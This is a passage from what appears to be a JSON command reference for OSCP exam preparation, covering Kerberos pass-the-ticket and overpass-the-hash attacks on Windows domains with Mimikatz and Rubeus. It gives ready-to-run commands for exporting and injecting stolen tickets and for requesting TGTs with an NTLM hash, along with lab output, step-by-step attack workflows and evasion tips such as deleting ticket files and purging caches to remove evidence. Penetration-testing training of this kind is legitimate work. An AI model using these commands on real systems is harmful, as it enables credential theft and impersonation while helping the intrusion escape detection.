exported:\n- .kirbi files are portable\n- Can be copied to USB/network\n- Can be moved to different machines\n- Can be injected into any Windows session\n- Cross-machine lateral movement enabled\n\nEXPORT OUTPUT EXAMPLES:\nFrom training, Mimikatz shows:\n```\n * Saved to file [0;3e7]-2-0-40e10000-dave@krbtgt-CORP.COM.kirbi\n * Saved to file [0;3e7]-2-1-40e10000-dave@ldap-DC1.CORP.COM.kirbi\n * Saved to file [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi\n```\n\nEach line indicates successful ticket export.\n\nLOGON SESSION IDS (LUID):\n- [0;3e7]: System session (LUID 0x3e7 = 999 decimal)\n- [0;12bd0]: User session (dave's interactive login)\n- Different LUIDs = different logon sessions\n- Same user can have multiple LUIDs (multiple sessions)\n\nTIME LIMIT ON TICKETS:\nExported tickets retain original expiration:\n- TGT: Typically 10 hours from issue\n- TGS: Typically 10 hours from issue\n- Check End Time after export\n- Expired tickets = useless\n\nVerify ticket validity:\n```powershell\nmimikatz # kerberos::list /export\n```\nShows expiration before export.\n\nMANUAL ALTERNATIVE:\nNo Windows-native tool exports tickets:\n- Mimikatz required for export\n- Rubeus alternative: Rubeus.exe dump\n- klist shows tickets but cannot export\n\nRubeus export:\n```\nRubeus.exe dump /service:krbtgt /nowrap\n```\nOutputs base64, not .kirbi files.\n\nSECURITY IMPLICATIONS:\n- Ticket theft doesn't trigger password change notifications\n- Legitimate ticket usage - hard to detect\n- No failed authentication logs\n- Stealthier than password attacks\n\nTIME ESTIMATE:\n- Export execution: 5-10 seconds\n- File review/identification: 1-2 minutes\n- Total: 2-3 minutes\n\nEXAM STRATEGY:\n1. Gain admin on compromised system\n2. Export ALL tickets immediately (sekurlsa::tickets /export)\n3. Identify high-value tickets (domain admins, service accounts)\n4. Identify tickets to target systems\n5. Inject relevant tickets for lateral movement\n6. Store .kirbi files for later use\n\nCOMMON FAILURES:\nprivilege::debug FAILED:\n- Not running mimikatz as Administrator\n- Right-click mimikatz.exe → Run as administrator\n\nNo tickets exported:\n- No active Kerberos sessions on system\n- Wait for users to login\n- Or trigger authentication (runas, net use, etc.)\n\nERROR kuhl_m_sekurlsa_acquireLSA:\n- LSASS Protected Process Light (PPL) enabled\n- Advanced protection - may need bypass\n- Try different system\n\nFORENSIC ARTIFACTS:\n- Mimikatz execution traces\n- LSASS process access (Event ID 10, Sysmon)\n- .kirbi files on disk (unless deleted)\n- File creation timestamps\n- Process creation (Event ID 4688)\n\nOPSEC CONSIDERATIONS:\n- Delete .kirbi files after injection\n- Use memory-only methods when possible\n- Mimikatz leaves traces in memory scanners\n- Consider Rubeus as less-detected alternative",
      "oscp_relevance": "high"
    },
    {
      "id": "passticket-mimikatz-inject",
      "name": "Pass-the-Ticket - Inject Ticket (Mimikatz)",
      "description": "Inject exported .kirbi Kerberos ticket into current session for impersonation",
      "command": "mimikatz # kerberos::ptt <TICKET_FILE>.kirbi",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TICKET_FILE>",
          "description": ".kirbi file to inject",
          "example": "[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "pass-the-ticket",
        "mimikatz",
        "kerberos",
        "lateral-movement",
        "active-directory",
        "windows",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "passticket-rubeus-ptt",
        "rubeus-ptt"
      ],
      "next_steps": [
        "kerberos-klist-verify  # Confirm ticket injected and shows in cache",
        "smb-list-shares  # Test access using stolen ticket (e.g., dir \\\\web04\\backup)",
        "passticket-mimikatz-export  # Export more tickets for additional targets"
      ],
      "flag_explanations": {
        "kerberos::ptt": "Pass-the-ticket module",
        "<FILE>.kirbi": "Ticket file to inject (full path or relative)"
      },
      "success_indicators": [
        "* File: '<FILE>.kirbi': OK",
        "Ticket successfully imported",
        "klist shows new ticket"
      ],
      "failure_indicators": [
        "ERROR kull_m_file_readData",
        "File not found",
        "Ticket import failed"
      ],
      "troubleshooting": {
        "File not found": "Use full path or ensure in current directory: dir *.kirbi",
        "Ticket import failed": ".kirbi file may be corrupted - re-export",
        "Access still denied after import": "Ticket may be expired - check with klist",
        "Wrong service": "Ensure ticket matches target service (cifs for file shares, http for web, etc.)"
      },
      "notes": "OSCP TRAINING MATERIAL - PASS-THE-TICKET INJECT WITH MIMIKATZ:\n\nTRAINING EXAMPLE (FROM OSCP MODULE):\nContinuing from Pass-the-Ticket export scenario:\n\nScenario: jen (lacking access) injects dave's ticket (has access) to reach \\\\web04\\backup.\n\nFrom CLIENT74 as jen, after exporting tickets:\n```\nmimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi\n\n* File: '[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi': OK\n```\n\nSuccess message confirms injection.\n\nVerify injection:\n```powershell\nPS C:\\Tools> klist\n\nCached Tickets: (1)\n\n#0>     Client: dave @ CORP.COM\n        Server: cifs/web04 @ CORP.COM\n        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n```\n\nTicket now cached as jen, but grants dave's access.\n\nTest access:\n```powershell\nPS C:\\Tools> ls \\\\web04\\backup\n\n    Directory: \\\\web04\\backup\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----        5/16/2022   1:11 PM          11541 backup.txt\n```\n\nSuccess! jen accessed \\\\web04\\backup using dave's stolen ticket.\n\nWHAT IS PASS-THE-TICKET INJECTION: Taking exported Kerberos ticket (.kirbi file) and loading it into current Windows session's ticket cache, enabling authentication as the ticket owner without their password or hash.\n\nCRITICAL UNDERSTANDING:\nAfter injection:\n- whoami: Still shows jen (process identity)\n- klist: Shows dave's ticket (authentication identity)\n- Network access: Authenticates as dave (ticket owner)\n- File operations to \\\\web04\\backup: Succeed as dave\n\nIdentity split:\n- Local identity: jen (process token)\n- Network identity: dave (Kerberos ticket)\n\nTRAINING SCENARIO BREAKDOWN:\nBefore injection:\n- jen attempts: ls \\\\web04\\backup\n- Result: Access denied (jen lacks permissions)\n\nAfter injection:\n- jen attempts: ls \\\\web04\\backup (same command)\n- Result: Success (dave's ticket used for authentication)\n\nNo password needed, no hash needed - just stolen ticket.\n\nHOW TICKET INJECTION WORKS:\n1. Mimikatz kerberos::ptt reads .kirbi file\n2. Parses Kerberos ticket structure\n3. Injects ticket into current session's ticket cache (via LsaCallAuthenticationPackage API)\n4. Windows Kerberos provider accepts ticket as legitimate\n5. Subsequent authentication uses injected ticket\n\nWHY THIS WORKS:\nWindows doesn't validate HOW ticket was obtained:\n- Legitimate: User authenticated, KDC issued ticket\n- Stolen: Mimikatz injected ticket from file\n- Windows treats both identically\n- No verification of ticket source\n- Ticket contains all necessary cryptographic proof\n\nNO ADMIN REQUIRED (CRITICAL ADVANTAGE):\nUnlike Pass-the-Hash:\n- Pass-the-Hash: Requires admin (LSASS access for injection)\n- Pass-the-Ticket (inject): NO admin required\n- Can inject into current user session\n- Can steal from OWN session and reuse\n\nFrom training: jen used her own tickets (as local admin) but could also use stolen tickets without admin if exporting from own session.\n\nTICKET SERVICE MATCHING:\nTicket service MUST match target:\n\nFrom training:\n- Ticket: dave@cifs-web04.kirbi\n- Service: CIFS (file shares)\n- Host: web04\n- Works for: \\\\web04\\* file access\n- Does NOT work for: \\\\web04 HTTP, \\\\files04 CIFS, etc.\n\nService examples:\n- cifs/hostname: File share access (SMB/CIFS)\n- http/hostname: Web services\n- ldap/hostname: Directory services\n- host/hostname: Generic host services\n- mssql/hostname: SQL Server\n\nTICKET TYPES FOR INJECTION:\nTGS (Service Ticket) - Like training example:\n- Specific service + host\n- Immediate use\n- Limited scope\n- Example: dave@cifs-web04.kirbi\n\nTGT (Ticket Granting Ticket) - Most valuable:\n- Can request ANY service ticket\n- Flexible\n- Example: dave@krbtgt-CORP.COM.kirbi\n- After injection, can access any service as dave\n\nFrom training scenario, TGS was sufficient (only needed web04 access), but TGT would enable broader access.\n\nMIMIKATZ INJECTION COMMAND:\n```\nmimikatz # kerberos::ptt <FILENAME>.kirbi\n```\n\nAlternative syntax:\n```\nmimikatz # kerberos::ptt /ticket:<FILENAME>.kirbi\n```\n\nBoth work identically.\n\nINJECTION VERIFICATION:\nAlways verify with klist:\n```powershell\nklist\n```\n\nSuccess indicators:\n- Cached Tickets: (N) where N increased\n- New ticket appears in list\n- Client: Shows ticket owner (dave)\n- Server: Shows service (cifs/web04)\n\nFailure indicators:\n- No new tickets\n- Error message from Mimikatz\n- File not found\n\nTESTING INJECTED TICKET:\nFrom training:\n```powershell\nls \\\\web04\\backup\n```\n\nAttempt access to resource ticket should grant.\n\nSuccess:\n- Directory listing appears\n- No \"Access denied\" error\n- Operations complete normally\n\nFailure:\n- Access denied: Ticket wrong service/expired/invalid\n- Network path not found: Hostname resolution issue\n- Logon failure: Ticket expired or invalid\n\nTICKET LIFETIME AND EXPIRATION:\nInjected tickets retain original expiration:\n- Original End Time preserved\n- No extension via injection\n- Check klist for End Time\n- Expired ticket = useless\n\nFrom training: Tickets typically 10-hour lifetime.\n\nIf ticket expired:\n- Cannot use (KDC rejects)\n- Must obtain fresh ticket\n- Export tickets immediately after compromise\n\nCROSS-SESSION INJECTION:\nTickets can be:\n- Exported from dave's session\n- Injected into jen's session\n- Used on same machine\n- Or moved to different machine\n\nPortability:\n- .kirbi file contains full ticket\n- Platform-independent (Windows only)\n- Machine-independent\n- Network-transferable\n\nMULTIPLE TICKET INJECTION:\nCan inject multiple tickets:\n```\nmimikatz # kerberos::ptt ticket1.kirbi\nmimikatz # kerberos::ptt ticket2.kirbi\nmimikatz # kerberos::ptt ticket3.kirbi\n```\n\nEach adds to cache:\n- klist shows all injected tickets\n- Multiple users/services accessible\n- No limit on concurrent tickets\n\nFILE PATH HANDLING:\nRelative path:\n```\nmimikatz # kerberos::ptt ticket.kirbi\n```\nLooks in current directory.\n\nAbsolute path:\n```\nmimikatz # kerberos::ptt C:\\Temp\\ticket.kirbi\n```\n\nNetw ork path:\n```\nmimikatz # kerberos::ptt \\\\attacker\\share\\ticket.kirbi\n```\n\nTROUBLESHOOTING:\nFile not found:\n- Check current directory: dir *.kirbi\n- Use full path\n- Verify filename spelling (case-sensitive in some contexts)\n\nTicket import failed:\n- .kirbi file corrupted\n- Re-export from source\n- Try different ticket\n\nAccess still denied after injection:\n- Ticket expired: Check klist End Time\n- Wrong service: Verify ticket service matches target\n- Wrong host: Verify ticket hostname matches target\n- Ticket invalid: Re-export fresh ticket\n\nMANUAL ALTERNATIVE:\nRubeus provides alternative:\n```\nRubeus.exe ptt /ticket:ticket.kirbi\n```\n\nSame functionality, different tool.\n\nAdvantage:\n- Rubeus less detected than Mimikatz\n- More modern codebase\n- Better OPSEC features\n\nTIME ESTIMATE:\n- Injection: 5-10 seconds\n- Verification (klist): 5 seconds\n- Test access: 10-30 seconds\n- Total: <1 minute\n\nEXAM STRATEGY:\n1. Export tickets from compromised systems\n2. Identify valuable tickets (high-privilege users, target services)\n3. Inject relevant tickets into your session\n4. Verify with klist\n5. Test access immediately\n6. If success, proceed with exploitation\n7. If failure, try different ticket or troubleshoot\n\nCOMPARISON TO OTHER TECHNIQUES:\nPass-the-Hash:\n- Requires: NTLM hash\n- Privilege: Admin (for injection)\n- Scope: NTLM authentication\n- Tools: Mimikatz, Impacket\n\nOverpass-the-Hash:\n- Requires: NTLM hash\n- Privilege: Admin (for Mimikatz)\n- Scope: Kerberos authentication\n- Result: Generates new TGT\n\nPass-the-Ticket:\n- Requires: Existing ticket\n- Privilege: None (for injection into own session)\n- Scope: Specific service or TGT\n- Result: Reuses stolen ticket\n\nPass-the-Ticket advantages:\n- No password/hash needed\n- No admin required (for injection)\n- Stealthier (reuses legitimate ticket)\n- Works across machines\n\nFORENSIC ARTIFACTS:\n- Mimikatz execution (if used)\n- .kirbi file on disk (unless deleted)\n- Kerberos authentication events (Event ID 4769 on target)\n- No new TGT request (reuses existing)\n- Ticket appears in klist output\n\nOPSEC CONSIDERATIONS:\n- Delete .kirbi files after injection\n- Use Rubeus instead of Mimikatz (less detected)\n- Inject tickets only when needed\n- Clear tickets after use (klist purge)\n- Stolen ticket usage looks legitimate (hard to detect)",
      "oscp_relevance": "high"
    },
    {
      "id": "passticket-rubeus-ptt",
      "name": "Pass-the-Ticket - Rubeus PTT",
      "description": "Inject .kirbi ticket using Rubeus (alternative to Mimikatz)",
      "command": "Rubeus.exe ptt /ticket:<TICKET_FILE>.kirbi",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TICKET_FILE>",
          "description": ".kirbi ticket file",
          "example": "ticket.kirbi",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "pass-the-ticket",
        "rubeus",
        "kerberos",
        "lateral-movement",
        "active-directory",
        "windows",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "passticket-mimikatz-inject"
      ],
      "next_steps": [
        "kerberos-klist-verify  # Verify ticket injected successfully",
        "smb-list-shares  # Test access using injected ticket"
      ],
      "flag_explanations": {
        "ptt": "Pass-the-ticket action",
        "/ticket": "Path to .kirbi file"
      },
      "success_indicators": [
        "[*] Ticket successfully imported",
        "klist shows ticket"
      ],
      "failure_indicators": [
        "Error importing ticket",
        "File not found"
      ],
      "troubleshooting": {
        "File not found": "Use full path",
        "Import failed": "Ensure .kirbi format correct"
      },
      "notes": "EDUCATIONAL CONTEXT: Rubeus provides modern alternative to Mimikatz for pass-the-ticket. WHY RUBEUS: More actively maintained, better OPSEC features. TIME ESTIMATE: <1 minute. EXAM TIP: Rubeus and Mimikatz both work - use whichever available.",
      "oscp_relevance": "high"
    },
    {
      "id": "overpass-rubeus-asktgt",
      "name": "Overpass-the-Hash - Rubeus asktgt",
      "description": "Request TGT using NTLM hash with Rubeus (alternative to Mimikatz sekurlsa::pth)",
      "command": "Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM_HASH> /ptt",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<USER>",
          "description": "Username",
          "example": "jen",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM (RC4) hash",
          "example": "369def79d8372408bf6e93364cc93075",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "overpass-the-hash",
        "rubeus",
        "kerberos",
        "lateral-movement",
        "active-directory",
        "windows",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "overpass-mimikatz-pth"
      ],
      "next_steps": [
        "kerberos-klist-verify  # Verify TGT received and cached",
        "psexec-sysinternals  # Use TGT for lateral movement with Kerberos"
      ],
      "flag_explanations": {
        "asktgt": "Request TGT from KDC",
        "/user": "Username",
        "/domain": "Domain FQDN",
        "/rc4": "NTLM hash (RC4 encryption)",
        "/ptt": "Pass-the-ticket - auto inject TGT",
        "/aes256": "Use AES256 hash instead (if available)"
      },
      "success_indicators": [
        "[*] Got TGT",
        "[*] Ticket successfully imported",
        "klist shows TGT"
      ],
      "failure_indicators": [
        "KDC_ERR_PREAUTH_FAILED",
        "KDC_ERR_CLIENT_NOT_FOUND"
      ],
      "troubleshooting": {
        "PREAUTH_FAILED": "Invalid hash",
        "CLIENT_NOT_FOUND": "Username/domain incorrect"
      },
      "notes": "EDUCATIONAL CONTEXT: Rubeus directly requests TGT using hash (cleaner than Mimikatz method). WHY USE THIS: Single command vs Mimikatz multi-step. TIME ESTIMATE: <1 minute. EXAM TIP: Rubeus asktgt more reliable than Mimikatz sekurlsa::pth.",
      "oscp_relevance": "high"
    },
    {
      "id": "kerberos-purge-tickets",
      "name": "Kerberos - Purge All Tickets",
      "description": "Clear all cached Kerberos tickets from current session",
      "command": "klist purge",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [],
      "tags": [
        "oscp",
        "kerberos",
        "cleanup",
        "opsec",
        "active-directory",
        "windows"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "overpass-mimikatz-pth  # Re-establish fresh Kerberos tickets if needed",
        "passticket-mimikatz-inject  # Inject new tickets after clearing cache"
      ],
      "flag_explanations": {
        "purge": "Delete all Kerberos tickets from cache"
      },
      "success_indicators": [
        "Ticket cache purged successfully",
        "klist shows 0 tickets"
      ],
      "failure_indicators": [
        "Access denied"
      ],
      "troubleshooting": {
        "Access denied": "Run as administrator or purge only affects current user tickets"
      },
      "notes": "EDUCATIONAL CONTEXT: Clean up ticket cache for OPSEC or testing. WHY USE: Remove evidence of ticket injection, prepare clean state. TIME ESTIMATE: <5 seconds. EXAM TIP: Use between testing different stolen tickets.",
      "oscp_relevance": "medium"
    },
    {
      "id": "kerberos-troubleshoot-time",
      "name": "Kerberos - Troubleshoot Time Skew",
      "description": "Check time synchronization between client and DC (Kerberos requires <5 min skew)",
      "command": "net time \\\\<DC>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<DC>",
          "description": "Domain controller hostname",
          "example": "DC1",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "kerberos",
        "troubleshooting",
        "time-sync",
        "active-directory",
        "windows"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "overpass-mimikatz-pth  # Retry overpass-the-hash after time sync",
        "passticket-mimikatz-export  # Re-export tickets after time sync resolved"
      ],
      "flag_explanations": {
        "net time": "Display or synchronize time",
        "\\\\<DC>": "Query time from DC",
        "/set /yes": "Synchronize local time to DC"
      },
      "success_indicators": [
        "Current time at \\\\<DC> is <TIME>",
        "Time difference <5 minutes"
      ],
      "failure_indicators": [
        "System error 5 - Access denied",
        "Time difference >5 minutes"
      ],
      "troubleshooting": {
        "Access denied": "Use /set /yes to force: net time \\\\<DC> /set /yes",
        ">5 min skew": "Kerberos will fail - synchronize time before retry",
        "Cannot contact DC": "Check network connectivity and firewall"
      },
      "notes": "EDUCATIONAL CONTEXT: Kerberos requires client and DC time within 5 minutes (default). WHY IMPORTANT: Time skew causes KDC_ERR_SKEW error, all Kerberos auth fails. COMMON ISSUE: VMs with suspended state, isolated networks without NTP. FIX: net time \\\\<DC> /set /yes synchronizes to DC time. TIME ESTIMATE: <10 seconds check, <30 seconds fix. EXAM TIP: If Kerberos mysteriously fails, check time first - common troubleshooting step.",
      "oscp_relevance": "medium"
    }
  ]
}